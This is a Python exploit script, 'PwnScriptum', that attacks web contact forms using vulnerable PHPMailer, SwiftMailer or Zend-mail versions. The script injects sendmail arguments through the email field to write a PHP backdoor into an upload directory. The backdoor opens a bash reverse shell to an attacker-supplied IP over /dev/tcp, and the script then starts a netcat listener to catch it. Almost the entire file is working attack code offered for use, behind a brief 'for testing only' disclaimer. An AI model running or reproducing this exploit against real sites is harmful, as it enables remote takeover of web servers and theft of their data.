import os
import argparse
import urllib.parse
import urllib.request
import socket
import sys

# Constants
VERSION = "1.1 Limited PoC"
DEFAULT_PORT = "8080"
DEFAULT_TIMEOUT = 3

# Function to print introductory message
def print_intro():
    print("""\033[94m
    __                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/
           
PHPMailer / Zend-mail / SwiftMailer - Remote Code Execution Exploit
             a.k.a "PwnScriptum"

CVE-2016-10033 + CVE-2016-10045 + CVE-2016-10034 + CVE-2016-10074

Discovered and Coded by:

\033[1;34m 
 Dawid Golunski
 https://legalhackers.com

 t: @dawid_golunski for updates
\033[0m
\033[94m 
P.$. For testing only! Don't break the Web ;)
\033[0m
""")

# Function to print information
def print_info():
    print("""
[Version]
Limited PoC (ver. {})

[PoC Video]
See the exploit in action at:

https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html

[Info]
This exploit targets a common webapp component - Contact Form. 

It combines payloads for the following vulnerabilities:

1. PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

2. PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045 / escapeshell bypass)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln.html

3. SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html

4. Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html

[Usage]

./PHPMaller_RCE_exploit.py [-h] -url WEBAPP_BASE_URL -cf CONTACT_SCRIPT
                                  [-d TARGET_UP_DIR] -ip ATTACKERS_IP
                                  [-p ATTACKERS_PORT] [--version]
                                  [--post-action POST_ACTION]
                                  [--post-name POST_NAME]
                                  [--post-email POST_EMAIL]
                                  [--post-msg POST_MSG]

Note, make sure the contact form matches the default field names (send/name/email/msg). 
Otherwise, override with --post-msg=message_box for example.
""".format(VERSION))

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(prog='PwnScriptum_RCE_exploit.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit (a.k.a \'PwnScriptum\')\nDiscovered by Dawid Golunski (https://legalhackers.com)')
    parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True, help='WebApp Base Url')
    parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True, help='Contact Form scriptname')
    parser.add_argument('-d',   dest='TARGET_UP_DIR',   required=False, help='Target Upload Dir', default="upload")
    parser.add_argument('-ip',  dest='ATTACKERS_IP',    required=True, help='Attackers Public IP for RevShell')
    parser.add_argument('-p',   dest='ATTACKERS_PORT',  required=False, help='Attackers Port for RevShell listener', default=DEFAULT_PORT)
    parser.add_argument('--version', action='version', version='%(prog)s {}'.format(VERSION))
    parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST "action" field name',         default="send")
    parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST "name of sender" field name', default="name")
    parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST "email" field name',          default="email")
    parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST "message" field name',        default="msg")
    return parser.parse_args()

# Function to generate payload based on the target
def generate_payload(target, target_dir, backdoor_file):
    if target == 1:
        return '"attacker\\" -oQ/tmp/ -X{}/{} some"@email.com'.format(target_dir, backdoor_file)
    elif target == 2:
        return "\"attacker\\' -oQ/tmp/ -X{}/{}  some\"@email.com".format(target_dir, backdoor_file)
    elif target in [3, 4]:
        return '"attacker\\" -oQ/tmp/ -X{}/{} "@email.com'.format(target_dir, backdoor_file)
    else:
        return None

# Function to upload the backdoor
def upload_backdoor(contact_script_url, post_fields):
    try:
        data = urllib.parse.urlencode(post_fields)
        req = urllib.request.Request(contact_script_url, data.encode('utf-8'))
        urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        print("[!] Got HTTP error: [{}] when uploading the payload. Check the URL!\n\n".format(e.code))
        sys.exit(3)
    except urllib.error.URLError as err:
        print("[!] Got the '{}' error when uploading the payload. Check the URL!\n\n".format(err.reason))
        sys.exit(4)

# Function to check if the backdoor was uploaded correctly
def check_backdoor(backdoor_url, timeout):
    got_timeout = False
    try:
        urllib.request.urlopen(backdoor_url, timeout=(timeout - 1))
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError as err:
        print("Some other error happened:", err.reason)
    except socket.timeout:
        got_timeout = True
    return got_timeout

# Main function
def main():
    print_intro()
    args = parse_arguments()

    # Set vars
    backdoor_file = 'phpbackdoor' + str(os.getpid()) + '.php'
    backdoor_url = args.WEBAPP_BASE_URL.rstrip('/') + '/' + args.TARGET_UP_DIR + '/' + backdoor_file
    contact_script_url = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT

    # Print parameters
    print("""[+] Setting vars to:

WEBAPP_BASE_URL     = {}
CONTACT_SCRIPT      = {}
TARGET_UP_DIR       = {}
ATTACKERS_IP        = {}
ATTACKERS_PORT      = {}
CONTACT_SCRIPT_URL  = {}
BACKDOOR_FILEl      = {}
""".format(args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.TARGET_UP_DIR, args.ATTACKERS_IP, args.ATTACKERS_PORT, contact_script_url, backdoor_file))

    print("[+] Choose your target / payload: ")
    print("\033[1;34m")
    print("[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)\n")
    print("[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) The escapeshellarg() bypass :)\n")
    print("[3] SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)\n")
    print("[4] Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n")
    print("\033[0m")

    try:
        target = int(input('[?] Select target [1-2]: '))
    except ValueError:
        print("Not a valid choice. Exiting\n")
        sys.exit(2)

    if target not in range(1, 5):
        print("No such target. Exiting\n")
        sys.exit(3)

    payload = generate_payload(target, args.TARGET_UP_DIR, backdoor_file)
    if not payload:
        print("Invalid payload. Exiting\n")
        sys.exit(4)

    print("\n[+] Generated mail() payload will upload the backdoor into the '{}' dir\n".format(args.TARGET_UP_DIR))

    rce_php_code = """<?php sleep({}); system("/bin/bash -c 'nohup bash -i >/dev/tcp/{}/{} 0<&1 2>&1' ");  ?>""".format(DEFAULT_TIMEOUT, args.ATTACKERS_IP, args.ATTACKERS_PORT)
    post_fields = {'action': args.POST_ACTION, args.POST_NAME: 'Jas Fasola', args.POST_EMAIL: payload, args.POST_MSG: rce_php_code}

    # Attack
    print("[+] Backdoor upload via the contact form at the URL '{}'\n".format(contact_script_url))
    upload_backdoor(contact_script_url, post_fields)

    # Check if the backdoor was uploaded correctly
    print("[+] Checking for the backdoor at the URL '{}'\n".format(backdoor_url))
    result = check_backdoor(backdoor_url, DEFAULT_TIMEOUT)
    if isinstance(result, int):
        print("[!] Something went wrong... Error [{}]. Try another dir? Push through, don't give up! :)\n".format(result))
        sys.exit(2)
    elif result:
        print("[*] \033[1;32mLooking good!\033[0m The sleep() worked by the looks of it :)\nUrlopen timed out just in time for the shell :)\n")
    else:
        print("[!] Something went wrong... Check the URL and try again.\n")
        sys.exit(3)

    # Spawn the shell and wait for the sleep() PHP call to finish before /bin/bash is called
    print("[+] We should get a shell if we got till here! Spawning netcat now! :)\n")
    print("[+] \033[1;34mPlease tell me you're seeing this too... ;)\033[0m\n")
    os.system("nc -v -l -p {}".format(args.ATTACKERS_PORT))
    print("\n[+] Shell closed. Removed the uploaded backdoor scripts?\n")
    print("\033[1;34mP.$. There's more to it :) Exiting, for now...\033[0m\n")

if __name__ == "__main__":
    main()